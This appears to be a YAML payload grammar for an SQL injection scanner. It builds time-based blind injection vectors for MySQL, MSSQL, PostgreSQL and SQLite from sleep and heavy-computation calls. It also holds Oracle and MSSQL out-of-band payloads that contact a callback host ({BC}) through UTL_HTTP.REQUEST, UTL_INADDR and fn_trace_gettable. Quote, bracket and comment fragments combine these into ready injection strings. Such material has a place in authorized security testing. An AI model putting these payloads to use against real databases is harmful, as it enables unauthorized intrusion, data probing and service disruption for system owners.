mysql_select:
  - BENCHMARK(100000000,MD5('A'))
  - SLEEP(11)
mssql_select:
  - WAITFOR DELAY '00:00:11'
  - (select * from fn_trace_gettable('\\{BC}\1.trc',default))
postgre_select:
  - pg_sleep(11) is not null
sqlite_select:
  - HEX(RANDOMBLOB(10000000000/2))

simple_select:
  - "%mysql_select;"
  - "%mssql_select;"
  - "%postgre_select;"
  - "%sqlite_select;"

oracle_select:
  - UTL_INADDR.get_host_name('10.0.0.1')
  - UTL_INADDR.get_host_address('{BC}')
  - UTL_HTTP.REQUEST('http://{BC}')

all_select:
  - "%simple_select;"
  - "%oracle_select;"

# all_select:
#   - "%simple_select;"

stacked:
  - BEGIN DBMS_LOCK.SLEEP(10); END; 
  - WAITFOR DELAY '00:00:10'
  - select * from fn_trace_gettable('\\{BC}\1.trc',default)

select_vectors:
  - "%plus;%all_select;" # +sleep(10)
  - "%plus;%all_select;%close;" #+sleep(10) -- 
  - "%quote;%plus;%all_select;%plus;%quote;a" # '+sleep(10)+'a
  - "%quote;)%plus;%all_select;%plus;(%quote;a" # ')+sleep(10)+('a
  - "%quote;%plus;%all_select;%close;" # '+sleep(10) -- 
  - "%quote; and %all_select; and %quote;1%quote;=%quote;a" #' and pg_sleep(10) is not null and '1'='a
  - "%quote;) and %all_select; and (%quote;1%quote;=%quote;a" #') and pg_sleep(10) is not null and ('1'='a
  - "(%all_select;)"
  - "(%all_select;)%close;"

plus:
  - '+'
  - '||'
  - ' and '

quote:
  - "'"
  - '"'

stacked_to_insert:
  - "%stacked;"
  - "select %simple_select;"

stacked_vectors:
  - "%brackets;; %stacked_to_insert;; %comments;"
  - "'%brackets;; %stacked_to_insert;; %comments;"

all_vectors:
  - "%select_vectors;"
  - "%stacked_vectors;"

close:
  - "%brackets; %comments;"

brackets:
  - ""
  - ")"
  - "))"
  - ")))"

comments:
  - " -- "
  - "/* "